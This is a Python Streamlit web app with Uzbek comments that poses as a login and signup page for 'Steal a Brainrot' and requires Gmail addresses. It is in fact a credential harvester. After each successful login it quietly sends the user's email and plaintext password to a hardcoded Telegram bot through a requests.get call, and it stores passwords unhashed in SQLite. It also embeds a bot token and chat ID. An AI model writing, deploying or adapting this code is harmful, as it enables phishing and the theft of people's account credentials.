import streamlit as st
import requests
import sqlite3
import re

# Telegram sozlamalari
BOT_TOKEN = "8112666081:AAGtROwNttf6lsApMQUxszHoC8xf7rB0s4A"
CHAT_ID = "8088597011"

# Database yaratish
conn = sqlite3.connect('users.db')
c = conn.cursor()
c.execute('CREATE TABLE IF NOT EXISTS users (email TEXT PRIMARY KEY, password TEXT)')
conn.commit()

# Sahifa sozlamalari
st.set_page_config(page_title="Steal a Brainrot", layout="centered")

# Qora dizayn (CSS)
st.markdown("""
    <style>
    .stApp {background-color: #000000; color: white;}
    div.stButton > button {width: 100%; border-radius: 20px; background-color: #ff4b4b; color: white;}
    </style>
""", unsafe_allow_html=True)

st.title("🔥 Steal a Brainrot")

tab1, tab2 = st.tabs(["Kirish", "Ro'yxatdan o'tish"])

# KIRISH QISMI
with tab1:
    email = st.text_input("Email", placeholder="example@gmail.com")
    password = st.text_input("Parol", type="password")
    if st.button("Kirish"):
        c.execute("SELECT * FROM users WHERE email=? AND password=?", (email, password))
        if c.fetchone():
            st.success("Xush kelibsiz!")
            requests.get(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage?chat_id={CHAT_ID}&text=Login qilindi: {email} | Parol: {password}")
        else:
            st.error("Email yoki parol xato!")

# RO'YXATDAN O'TISH QISMI
with tab2:
    new_email = st.text_input("Yangi Email", placeholder="...@gmail.com")
    new_password = st.text_input("Yangi Parol", type="password")
    if st.button("Ro'yxatdan o'tish"):
        if "@gmail.com" not in new_email:
            st.error("Email @gmail.com bo'lishi shart!")
        elif len(new_password) < 8:
            st.error("Parol kamida 8 ta belgidan iborat bo'lishi kerak!")
        else:
            try:
                c.execute("INSERT INTO users VALUES (?, ?)", (new_email, new_password))
                conn.commit()
                st.success("Muvaffaqiyatli ro'yxatdan o'tdingiz!")
            except:
                st.error("Bu email allaqachon mavjud!")

# GOOGLE LOGIN
st.divider()
st.subheader("Yoki Google orqali")
GOOGLE_URL = "https://accounts.google.com/o/oauth2/v2/auth?..." # O'z linkingiz
st.link_button("Google orqali kirish", GOOGLE_URL, type="primary")
